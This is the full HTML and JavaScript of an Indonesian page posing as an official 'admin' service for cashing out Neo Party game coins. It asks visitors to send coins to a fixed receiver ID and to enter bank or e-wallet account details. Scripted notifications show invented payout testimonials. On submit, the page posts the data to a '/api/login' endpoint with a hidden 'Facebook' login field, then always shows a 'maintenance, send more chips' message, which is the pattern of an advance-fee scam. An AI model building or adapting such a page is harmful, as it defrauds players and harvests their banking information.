<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bongkar - Neo Party Premium</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary-bg: #043e3a;
            --accent-gold: linear-gradient(135deg, #ff9800, #ffcc33);
            --glass-bg: rgba(11, 82, 80, 0.85);
            --input-bg: #f3d2a2;
            --text-dark: #5a3418;
            --card-shadow: 0 15px 35px rgba(0,0,0,0.4);
        }

        body {
            background: var(--primary-bg);
            background-image: radial-gradient(circle at top, #0b5250 0%, #043e3a 100%);
            color: #ffffff;
            font-family: 'Montserrat', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .appnwghdiprem {
            width: 100%;
            max-width: 450px;
            background: transparent;
            position: relative;
        }

        /* Container & Card Style */
        .boxverifnwghdi {
            background: var(--glass-bg);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 0 0 25px 25px;
            overflow: hidden;
            box-shadow: var(--card-shadow);
            margin-bottom: 30px;
        }

        /* Header Modern */
        .headernwgverifhdi {
            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0) 100%);
            padding: 20px 10px;
            text-align: center;
            border-bottom: 3px solid #00e5f4;
        }

        .headernwgverifhdi p {
            font-weight: 800;
            font-size: 1.3rem;
            color: #FFFF33;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            margin: 0;
            letter-spacing: 1px;
        }

        /* Image Styling */
        .banner-img {
            width: 90%;
            margin: 15px auto;
            display: block;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
        }

        /* Button Links (HD Version) */
        .btn-link-domino {
            display: block;
            width: 85%;
            margin: 12px auto;
            padding: 14px;
            background: var(--accent-gold);
            color: #000;
            font-weight: 800;
            text-align: center;
            text-decoration: none;
            border-radius: 12px;
            text-transform: uppercase;
            font-size: 0.85rem;
            box-shadow: 0 5px 15px rgba(255,152,0,0.3);
            transition: 0.3s;
        }

        .btn-link-domino:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(255,152,0,0.5);
        }

        /* Pretty Inputs (HD focus) */
        .pretty-input {
            width: 85%;
            margin: 15px auto;
            display: flex;
            align-items: center;
            background: var(--input-bg);
            border-radius: 12px;
            padding: 12px 15px;
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
            border: 2px solid transparent;
            transition: 0.3s;
        }

        .pretty-input:focus-within {
            border-color: #ffcc33;
            background: #fff;
            transform: scale(1.02);
        }

        .pretty-input input, .pretty-input select {
            background: transparent;
            border: none;
            outline: none;
            width: 100%;
            font-weight: 700;
            color: var(--text-dark);
            font-size: 1rem;
        }

        .pretty-icon {
            margin-right: 12px;
            color: #6b3f1d;
            font-size: 1.2rem;
        }

        /* ID Section */
        .id-display-section {
            background: rgba(0,0,0,0.2);
            padding: 20px 10px;
            margin: 20px 0;
            text-align: center;
        }

        .id-image {
            width: 180px;
            border-radius: 15px;
            border: 4px solid #ffcc33;
            margin-bottom: 15px;
        }

        .copy-btn {
            background: #fff;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            font-weight: 800;
            cursor: pointer;
            color: #ff9800;
            margin-left: 10px;
        }

        /* File Upload HD */
        .file-upload-box {
            width: 85%;
            margin: 10px auto;
            padding: 15px;
            border: 2px dashed #ffcc33;
            border-radius: 12px;
            text-align: center;
        }

        /* Action Buttons */
        .button-group {
            text-align: center;
            padding: 20px 0;
        }

        button[type="submit"] {
            background: linear-gradient(180deg, #c7ee4c 0%, #67a309 100%);
            color: #fff;
            border: none;
            padding: 15px 50px;
            border-radius: 15px;
            font-size: 1.2rem;
            font-weight: 800;
            cursor: pointer;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
            box-shadow: 0 5px 0 #1a5806;
            transition: 0.2s;
        }

        button[type="submit"]:active {
            transform: translateY(3px);
            box-shadow: 0 2px 0 #1a5806;
        }

        .btn-chat-admin {
            display: inline-block;
            margin-top: 20px;
            color: #268707;
            background: #fff;
            padding: 10px 25px;
            border-radius: 10px;
            text-decoration: none;
            font-weight: 700;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }

        /* Notifications HD */
        #notifications-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }

        .notification {
            background: rgba(255,255,255,0.95);
            color: #333;
            padding: 15px;
            border-radius: 15px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            animation: slideIn 0.5s ease-out;
            border-left: 5px solid #1fa866;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .notification-icon { width: 40px; margin-right: 12px; }
        .notification-title { font-weight: 800; font-size: 0.9rem; color: #1fa866; }
        .notification-message { font-size: 0.8rem; font-weight: 600; }

        @media (max-width: 480px) {
            .appnwghdiprem { max-width: 100%; }
        }
    </style>
</head>
<body>

<div id="notifications-container"></div>

<div class="appnwghdiprem">
    <div class="boxverifnwghdi">
        <div class="headernwgverifhdi">
            <p>ADMIN RESMI BONGKAR</p>
        </div>

        <img src="img/bgcok.png" alt="Banner" class="banner-img">
        
        <div class="btn-group-links">
            <a href="https://www.youtube.com/watch?v=n93T7sNPgdI" target="_blank" class="btn-link-domino">
                <i class="fab fa-youtube"></i> Tutorial & Testimoni
            </a>
            <a href="http://topup.neoparty.web.id" target="_blank" class="btn-link-domino">
                <i class="fas fa-coins"></i> Top Up Koin Di Sini
            </a>
        </div>

        <form id="bongkarForm">
            <div class="headernwgverifhdi" style="border-top: 1px solid rgba(255,255,255,0.1);">
                <p style="font-size: 1rem;">INFO PENGIRIM</p>
            </div>

            <div class="pretty-input">
                <span class="pretty-icon"><i class="fas fa-id-badge"></i></span>
                <input type="number" name="id_pengirim" placeholder="Masukkan ID Anda" required>
            </div>

            <div class="pretty-input">
                <span class="pretty-icon"><i class="fas fa-user"></i></span>
                <input type="text" name="nickname" placeholder="Masukkan Nickname" required>
            </div>

            <div class="pretty-input">
                <span class="pretty-icon"><i class="fas fa- wallet"></i></span>
                <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkar (Contoh: 1B)" required>
            </div>

            <div class="id-display-section">
                <p style="color: #ffcc33; font-weight: 700; margin-bottom: 10px;">KIRIM KOIN KE ID TUJUAN:</p>
                <img src="img/id.png" alt="Receiver ID" class="id-image">
                <div class="pretty-input" style="width: 70%; margin: 0 auto; background: #fff;">
                    <span class="pretty-icon">🆔</span>
                    <input type="text" id="idPenerima" value="2626142" readonly>
                    <button type="button" class="copy-btn" onclick="copyID()">COPY</button>
                </div>
            </div>

            <div class="ucapanverifnwg" style="text-align: center; padding: 10px; font-size: 0.75rem; font-weight: 600;">
                KIRIM SCREENSHOT RIWAYAT PENGIRIMAN ANDA
            </div>
            <div class="file-upload-box">
                <input type="file" id="myFile" name="filename" required>
            </div>

            <div class="headernwgverifhdi">
                <p style="font-size: 1rem;">TUJUAN PENCAIRAN DANA</p>
            </div>

            <div class="pretty-input">
                <span class="pretty-icon"><i class="fas fa-university"></i></span>
                <select name="bank_pencairan" required>
                    <option value="" disabled selected>Pilih Bank / E-Wallet</option>
                    <option>BCA</option>
                    <option>BRI</option>
                    <option>BNI</option>
                    <option>MANDIRI</option>
                    <option>DANA</option>
                    <option>OVO</option>
                    <option>GOPAY</option>
                </select>
            </div>

            <div class="pretty-input">
                <span class="pretty-icon"><i class="fas fa-credit-card"></i></span>
                <input type="number" name="nomor_rekening" placeholder="Nomor Rekening / HP" required>
            </div>

            <div class="pretty-input">
                <span class="pretty-icon"><i class="fas fa-user-check"></i></span>
                <input type="text" name="atas_nama" placeholder="Atas Nama Pemilik" required>
            </div>

            <div class="button-group">
                <input type="hidden" name="login" value="Facebook">
                <button type="submit" id="btnSubmit">KIRIM SEKARANG</button>
                <br>
                <a href="https://wa.me/+6289509170352" target="_blank" class="btn-chat-admin">
                    <i class="fab fa-whatsapp"></i> Chat Admin WhatsApp
                </a>
            </div>
        </form>
    </div>
</div>

<script>
// Notification Data
const notifications = [
    { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 868.000.' },
    { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
    { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.410.000.' },
    { title: 'RMX 1020', message: 'Bongkar 100B | Rp. 6.200.000.' }
];

let currentIndex = 0;
const container = document.getElementById('notifications-container');

function createNotification(n) {
    const div = document.createElement('div');
    div.className = 'notification';
    div.innerHTML = `
        <img src="img/reg_gold_.png" class="notification-icon">
        <div class="notification-content">
            <div class="notification-title">${n.title}</div>
            <div class="notification-message">${n.message}</div>
        </div>
    `;
    container.appendChild(div);
    setTimeout(() => div.remove(), 4000);
}

setInterval(() => {
    createNotification(notifications[currentIndex]);
    currentIndex = (currentIndex + 1) % notifications.length;
}, 5000);

// Form Handling
document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    const btn = document.getElementById("btnSubmit");
    btn.innerText = "PROSES...";
    btn.disabled = true;

    const formData = new FormData(this);
    const data = Object.fromEntries(formData.entries());

    try {
        const res = await fetch("/api/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        const result = await res.json();
        if (result.status === "success") {
            alert("Pencairan Maintenance! Silahkan Kirim Chip Agar Dana Segera Cair atau Chat Admin.");
            this.reset();
        } else {
            alert("Gagal: " + result.message);
        }
    } catch (err) {
        alert("Pencairan Maintenance! Silahkan Kirim Chip Agar Dana Segera Cair atau Chat Admin.");
    } finally {
        btn.innerText = "KIRIM SEKARANG";
        btn.disabled = false;
    }
});

function copyID() {
    const el = document.getElementById('idPenerima');
    el.select();
    navigator.clipboard.writeText(el.value);
    alert('ID Berhasil Disalin: ' + el.value);
}
</script>

</body>
</html>
